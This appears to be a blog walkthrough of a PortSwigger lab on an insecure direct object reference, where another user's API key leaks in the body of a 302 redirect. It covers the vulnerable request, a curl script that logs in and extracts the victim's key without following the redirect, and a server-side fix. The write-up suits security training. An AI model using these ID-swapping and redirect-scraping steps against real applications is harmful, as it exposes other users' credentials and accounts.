---
layout: post
title: "PortSwigger: User ID Controlled by Request Parameter, with Data Leakage in Redirect"
date: 2027-09-26 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, AccessControl]
tags: [portswigger, access-control, broken-access-control, idor, horizontal-privilege-escalation, insecure-direct-object-reference, redirect, information-disclosure, cwe-639]
---

This is the same username-keyed [IDOR](https://cwe.mitre.org/data/definitions/639.html) as the previous lab — [CWE-639](https://cwe.mitre.org/data/definitions/639.html), authorization bypass through a user-controlled key — with one extra twist that catches a lot of people: the app *looks* like it blocks you. Request another user's account and the server fires back a **302 redirect to the login page**. Looks denied. It isn't — the victim's data is sitting in the body of that redirect response.

## Overview

You get a normal account (`wiener:peter`). The objective is the same: steal carlos's API key and submit it.

## The tell

Log in and look at your own account request:

```
GET /my-account?id=wiener
```

Your username is in the `id` parameter and the response contains *your* API key. As before, that parameter is the whole access-control decision — the server uses it to pick the account record and never checks it matches your session.

## The attack

Swap the username, sending it with your own `wiener` session cookie:

```
GET /my-account?id=carlos
```

The response is **not** carlos's account page rendered with a `200`. It's a redirect:

```
HTTP/2 302
location: /login
content-length: 3759
```

A browser sees that `302`, follows it, and shows you the login form — so as far as the UI is concerned, you were bounced. But look at the `content-length`: 3759 bytes. The redirect has a full body, and that body is carlos's account page:

```html
<div>Your API Key is: csDHyhY45MnJf7Z7YhzeYz6X0HlzumM4</div>
```

The server built the protected page first, *then* decided to redirect — and shipped the data anyway. The trick is simply to **not follow the redirect** and read the raw `302` body. Submitting that key solves the lab.

With `curl`:

```bash
# 1. Log in as wiener (grab the login CSRF token first)
csrf=$(curl -s -c cookies.txt "$URL/login" | grep -oP 'name="csrf" value="\K[^"]+')
curl -s -b cookies.txt -c cookies.txt -d "csrf=$csrf&username=wiener&password=peter" "$URL/login"

# 2. IDOR — read carlos's account from the redirect body.
#    -s WITHOUT -L: do not follow the 302, so the leaked body is preserved.
curl -s -b cookies.txt "$URL/my-account?id=carlos" | grep -oP 'Your API Key is: \K[^<]+'
```

The critical detail is the missing `-L`. Add `curl -L` (or leave "follow redirects" on in Burp) and curl chases the `302` to `/login`, throws the body away, and you see nothing — exactly why the bug hides from a normal browser.

## Why it worked

Two bugs stacked together:

- **Broken authorization** (CWE-639): authorization is tied to the request-supplied `id` instead of the authenticated session, so a logged-in user can name any account.
- **Information disclosure in a redirect**: the response was assembled with the victim's sensitive data *before* the access decision turned into a redirect. The `302` is a UI-level "deny" — it does nothing to strip content already written into the response body.

Because the leak lives in a response the browser discards, it feels secure during manual clicking and only shows up when you inspect the raw HTTP exchange.

## The fix

Make the authorization decision *before* you build the response, and never put another user's data in a body you're redirecting away:

```python
# vulnerable — renders the page, then redirects, leaking the body
account = Account.get(id=request.args["id"])   # trusts the request
body = render_account(account)
return redirect("/login", body=body)           # 302, but body still leaks

# fixed — authorize first, return an empty-bodied redirect/deny
if request.args["id"] != session["user_id"]:
    return redirect("/login")                   # no sensitive body, ever
account = Account.get(id=session["user_id"])    # scoped to the caller
return render_account(account)
```

Derive identity from the session, deny by default, and ensure any non-`200` response carries no protected content.
